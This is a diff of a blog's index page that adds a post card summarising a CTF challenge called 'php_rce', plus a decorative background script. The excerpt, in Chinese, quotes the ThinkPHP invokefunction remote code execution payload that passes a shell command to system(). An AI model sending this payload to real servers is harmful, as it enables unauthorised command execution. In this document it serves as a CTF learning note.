@@ -181,6 +181,50 @@
     <article class="col-12 col-md-12 mx-auto index-info">
       <h1 class="index-header">
         
+        <a href="/2021/01/15/GFSJ/">GFSJ</a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/01/15/GFSJ/">
+          
+          
+            
+          
+          php_rce
+题目：          
+解摸索了半天，还是没有找到有价值的信息，看了别人的WP后知道原来这是Think PHP的一个远程代码执行漏洞：
+ ? s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=xxxxx（命令）         
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-01-15 17:35" pubdate>
+              2021-01-15
+            </time>
+          </div>
+        
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/wp/">wp</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
         <a href="/2021/01/15/BUU001/">BUU每日一题001</a>
       </h1>
 
@@ -821,6 +865,11 @@ html链接html链接通过标签&lt;a&gt;&lt;/a&gt;定义。&lt;a hre
 <script  src="/js/boot.js" ></script>
 
 
+
+//背景线条
+{% if theme.canvas_nest %}
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+{% endif %}
 
 </body>
 </html>
